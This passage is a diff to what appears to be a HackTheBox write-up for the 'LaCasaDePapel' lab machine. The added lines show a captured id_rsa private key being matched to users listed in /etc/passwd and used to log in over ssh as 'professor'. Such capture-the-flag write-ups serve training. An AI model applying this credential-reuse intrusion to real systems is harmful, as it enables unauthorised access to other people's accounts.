@@ -447,4 +447,25 @@ id_rsa: OpenSSH private key
 ┌──(kali㉿kali)-[~/hackthebox/lacasadepapel]
 └─$ chmod 600 id_rsa 
 ```
+Now, I have to figure out whose is this key. From the output of /etc/passwd, I can see three available users, `professor`, `berlin` and `dali`. I'll try them manually.
+
+My first guess is a success, I can connect as professor.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/lacasadepapel]
+└─$ ssh -i id_rsa professor@lacasadepapel.htb
+
+ _             ____                  ____         ____                  _ 
+| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
+| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
+| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
+|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
+                                                            |_|       
+
+lacasadepapel [~]$ whoami
+professor
+lacasadepapel [~]$ ls
+memcached.ini  memcached.js  node_modules
+lacasadepapel [~]$ 
+```
 
